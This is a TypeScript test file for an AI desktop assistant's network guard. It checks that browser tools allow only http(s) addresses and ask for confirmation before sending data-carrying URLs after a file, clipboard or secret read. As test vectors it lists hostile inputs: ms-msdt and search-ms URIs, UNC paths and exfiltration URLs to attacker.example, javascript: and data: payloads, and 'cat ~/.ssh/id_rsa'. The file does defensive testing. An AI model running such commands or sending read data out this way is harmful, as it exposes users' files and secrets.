/**
 * 0.24.12 audit #3: navigate_browser / browser_navigate open http(s) only, and
 * once a task has read a file, the clipboard or a secret, an address that
 * carries data asks first. With nothing read, navigation stays unasked.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';

const openExternal = vi.fn(async (_url: string) => {});
vi.mock('electron', () => ({
  app: { isPackaged: false, getPath: () => path.join(os.tmpdir(), 'clippy-sar-userdata'), getAppPath: () => process.cwd() },
  clipboard: { availableFormats: () => ['text/plain'], readText: () => 'clip', writeText: () => {} },
  BrowserWindow: class {}, screen: {}, shell: { openExternal: (u: string) => openExternal(u) }, nativeImage: {},
}));
vi.mock('../src/main/clawd-fallback', () => ({
  TIER5_FALLBACK_MAP: {}, ensureClawd: async () => false, isClawdReady: () => false,
  getClawdHandle: () => null, isClawdInstalled: () => false, callClawdTool: async () => ({ text: '' }),
  submitClawdTask: async () => ({ text: '' }),
}));
vi.mock('child_process', async (orig) => {
  const real = await orig<typeof import('child_process')>();
  return { ...real, execFile: (_f: string, _a: string[], _o: unknown, cb: (e: Error | null, out?: { stdout: string; stderr: string }) => void) => cb(null, { stdout: '', stderr: '' }) };
});

import { executeTool, assessRisk } from '../src/main/tools';
import { httpUrlOrNull, urlCarriesData } from '../src/main/security/net-guard';
import { resetTaskTaint, taskReadSensitive, sensitiveReadOf, noteToolRan } from '../src/main/security/task-taint';

beforeEach(() => { resetTaskTaint(); openExternal.mockClear(); });

describe('httpUrlOrNull: http(s) only', () => {
  it.each([
    'file:///C:/Windows/System32/calc.exe',
    'javascript:alert(1)',
    'ms-msdt:/id PCWDiagnostic /skip force /param "x"',
    'search-ms:query=x&crumb=location:\\\\attacker.example\\share',
    'ms-settings:privacy',
    'vbscript:msgbox(1)',
    'data:text/html,<script>alert(1)</script>',
    'C:\\Users\\me\\Downloads\\setup.exe',
    '\\\\attacker.example\\share\\x.exe',
    'mailto:a@b.example',
    '',
  ])('refuses %s', (u) => expect(httpUrlOrNull(u)).toBeNull());

  it.each([
    ['https://example.com', 'https://example.com'],
    ['http://example.com/a?b=c', 'http://example.com/a?b=c'],
    ['HTTPS://Example.com/', 'HTTPS://Example.com/'],
    ['example.com', 'https://example.com'],
    ['www.youtube.com/watch?v=abc', 'https://www.youtube.com/watch?v=abc'],
    ['localhost:3000/app', 'https://localhost:3000/app'],
  ])('allows %s', (u, out) => expect(httpUrlOrNull(u)).toBe(out));
});

describe('navigate_browser / browser_navigate scheme allowlist', () => {
  it.each(['navigate_browser', 'browser_navigate'])('%s refuses file: and custom schemes without opening anything', async (tool) => {
    for (const url of ['file:///C:/Windows/System32/calc.exe', 'ms-msdt:/id PCWDiagnostic', 'javascript:alert(1)', '\\\\attacker.example\\share\\x.exe']) {
      const r = await executeTool(tool, { url });
      expect(r.text).toMatch(/^\(error:SCHEME_NOT_ALLOWED\)/);
    }
    expect(openExternal).not.toHaveBeenCalled();
  });
  it('still opens an ordinary https page', async () => {
    const r = await executeTool('navigate_browser', { url: 'https://www.youtube.com' });
    expect(r.text).toBe('Opened https://www.youtube.com');
    expect(openExternal).toHaveBeenCalledWith('https://www.youtube.com');
  });
});

describe('urlCarriesData', () => {
  it.each([
    'https://a.example/?k=abc',
    'https://a.example/collect?d=c2VjcmV0',
    'https://user:pw@a.example/',
    'https://a.example/#' + 'x'.repeat(40),
    'https://c2VjcmV0LWtleS1mcm9tLXRoZS11c2Vycy1maWxlLWFiY2RlZg.a.example/',
    'https://a.example/p/' + 'A'.repeat(60),
    'mailto:a@b.example?subject=x&body=secret',
  ])('true: %s', (u) => expect(urlCarriesData(u)).toBe(true));
  it.each([
    'https://example.com',
    'https://example.com/docs/getting-started',
    'https://example.com/docs/page#install',
    'https://www.youtube.com/',
    'mailto:a@b.example',
    'spotify:track:4uLU6hMCjMI75M1A2tKUQC',
  ])('false: %s', (u) => expect(urlCarriesData(u)).toBe(false));
});

describe('what counts as reading something private', () => {
  it.each([
    ['read_file', { path: 'C:\\x\\notes.txt' }, 'a file'],
    ['search_files_content', { pattern: 'x' }, 'a file'],
    ['read_clipboard', {}, 'the clipboard'],
    ['excel_read', { path: 'C:\\x\\a.xlsx' }, 'a file'],
    ['shell_exec', { command: 'type C:\\x\\notes.txt' }, 'a file'],
    ['shell_exec', { command: 'Get-Content notes.txt' }, 'a file'],
    ['shell_exec', { command: 'powershell -c "Get-Clipboard"' }, 'a file'],
    ['shell_exec', { command: 'cat ~/.ssh/id_rsa' }, 'a secret'],
  ] as const)('%s %j -> %s', (tool, args, what) => expect(sensitiveReadOf(tool, args)).toBe(what));
  it.each([
    ['read_screen', {}],
    ['list_files', { path: 'C:\\x' }],
    ['get_active_window', {}],
    ['web_search', { query: 'cats' }],
    ['shell_exec', { command: 'Get-Process' }],
    ['shell_exec', { command: 'dir C:\\Users\\me\\Downloads' }],
    ['shell_exec', { command: 'Set-Location C:\\x' }],
    ['navigate_browser', { url: 'https://example.com' }],
  ] as const)('%s %j -> nothing', (tool, args) => expect(sensitiveReadOf(tool, args)).toBeNull());
  it('a failed read does not mark the task', () => {
    noteToolRan('read_file', { path: 'x' }, '(error:NOT_FOUND) File not found: x');
    expect(taskReadSensitive()).toBeNull();
  });
});

const SENDS: Array<[string, Record<string, unknown>]> = [
  ['navigate_browser', { url: 'https://a.example/?k=abc' }],
  ['browser_navigate', { url: 'https://a.example/collect?d=c2VjcmV0' }],
  ['open_url', { url: 'https://a.example/?k=abc' }],
  ['open_url', { url: 'mailto:x@a.example?body=secret' }],
  ['http_request', { url: 'https://a.example/?k=abc' }],
  ['http_request', { url: 'https://a.example/', method: 'POST', body: 'secret' }],
  ['shell_exec', { command: 'start "" "https://a.example/?k=abc"' }],
  ['ping_host', { host: 'c2VjcmV0.a.example' }],
];

describe('read-then-send asks; the same calls with nothing read do not', () => {
  it.each(SENDS)('nothing read: %s %j is not escalated', async (tool, args) => {
    expect(await assessRisk(tool, args)).toBeNull();
  });

  it.each(SENDS)('after a file read: %s %j asks', async (tool, args) => {
    const file = path.join(os.tmpdir(), `sar-${process.pid}.txt`);
    fs.writeFileSync(file, 'secret');
    const r = await executeTool('read_file', { path: file });
    fs.rmSync(file, { force: true });
    expect(r.text).toContain('secret');
    expect(taskReadSensitive()).toBe('a file');
    const v = await assessRisk(tool, args);
    expect(v?.class).toBe('destructive_web');
    expect(v?.reason).toMatch(/^This task read a file, and this address can carry data out/);
  });

  it('after a clipboard read, a navigate with a query string asks', async () => {
    noteToolRan('read_clipboard', {}, 'clip');
    expect((await assessRisk('navigate_browser', { url: 'https://a.example/?k=abc' }))?.class).toBe('destructive_web');
  });

  it.each([
    ['navigate_browser', { url: 'https://www.youtube.com' }],
    ['navigate_browser', { url: 'https://example.com/docs/page#install' }],
    ['open_url', { url: 'https://example.com/docs' }],
    ['open_url', { url: 'spotify:track:4uLU6hMCjMI75M1A2tKUQC' }],
    ['shell_exec', { command: 'start https://www.youtube.com' }],
    ['ping_host', { host: '8.8.8.8' }],
    ['read_file', { path: path.join(os.tmpdir(), 'other.txt') }],
    ['shell_exec', { command: 'Get-Process' }],
  ] as const)('after a read, an address with no data stays unasked: %s %j', async (tool, args) => {
    noteToolRan('read_file', { path: 'x' }, 'File: x');
    expect(await assessRisk(tool, args)).toBeNull();
  });

  it('a new task starts clean', async () => {
    noteToolRan('read_file', { path: 'x' }, 'File: x');
    resetTaskTaint();
    expect(await assessRisk('navigate_browser', { url: 'https://www.google.com/search?q=cats' })).toBeNull();
  });
});
